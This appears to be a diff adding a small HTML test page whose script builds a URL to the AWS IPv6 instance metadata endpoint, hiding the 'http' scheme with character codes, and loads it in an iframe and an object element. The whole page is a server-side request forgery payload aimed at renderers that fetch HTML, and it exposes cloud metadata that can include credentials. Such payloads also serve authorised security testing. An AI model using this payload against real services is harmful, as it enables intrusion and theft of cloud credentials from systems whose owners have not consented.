@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><title>P1 Test</title></head>
+<body>
+<h1>IFRAME_TEST_PAGE</h1>
+<div id="container"></div>
+<script>
+var proto = String.fromCharCode(104,116,116,112); // "http"
+var host = "fd00:ec2::254";
+var path = "/latest/meta-data/";
+var url = proto + "://[" + host + "]" + path;
+var iframe = document.createElement('iframe');
+iframe.src = url;
+iframe.width = "100%";
+iframe.height = "800";
+iframe.style.border = "2px solid red";
+document.getElementById('container').appendChild(iframe);
+
+// Also create object
+var obj = document.createElement('object');
+obj.data = url;
+obj.type = "text/html";
+obj.width = "100%";
+obj.height = "500";
+document.getElementById('container').appendChild(obj);
+
+// Status
+document.getElementById('container').insertAdjacentHTML('beforeend',
+  '<p>URL_CONSTRUCTED: ' + url + '</p>');
+</script>
+</body>
+</html>
